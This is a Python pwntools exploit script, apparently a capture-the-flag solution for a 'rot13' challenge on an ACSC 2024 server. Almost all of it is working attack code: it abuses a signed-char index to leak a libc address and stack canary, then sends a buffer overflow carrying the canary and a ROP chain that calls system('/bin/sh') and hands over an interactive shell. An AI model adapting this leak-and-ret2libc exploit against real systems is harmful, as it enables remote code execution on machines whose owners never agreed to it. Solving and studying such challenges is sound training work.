from pwn import *

exe = ELF('./rot13_patched')
libc = ELF('./libc.so.6')

HOST = 'rot13.chal.2024.ctf.acsc.asia'
PORT = 9999

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]

gs = '''
b main
c
'''

def start():
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST, PORT)  
    else:
        return process([exe.path])

# the type of buf[i] is char (not unsigned), so we can leak before the &table.
io = start()

io.sendlineafter(b': ', b'\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f' + b'\xe8\xe9\xea\xeb\xec\xed\xee\xef')
io.recvuntil(b': ')
addr_libc_base = unpack(io.recv(0x8)) - 0x21b780
stack_canary = unpack(io.recv(8))

log.info(f'addr_libc_base = {addr_libc_base: #x}')
log.info(f'stack_canary = {stack_canary: #x}')

libc.address = addr_libc_base
rop = ROP(libc)
rop.raw(rop.find_gadget(['ret']))
rop.raw(rop.find_gadget(['pop rdi', 'ret']))
rop.raw(pack(next(libc.search(b'/bin/sh\0'))))
rop.raw(pack(libc.sym['system']))

io.sendlineafter(b': ', b'a' * 0x108 + pack(stack_canary) + pack(0) + rop.chain())
io.sendlineafter(b': ', b'')

io.interactive()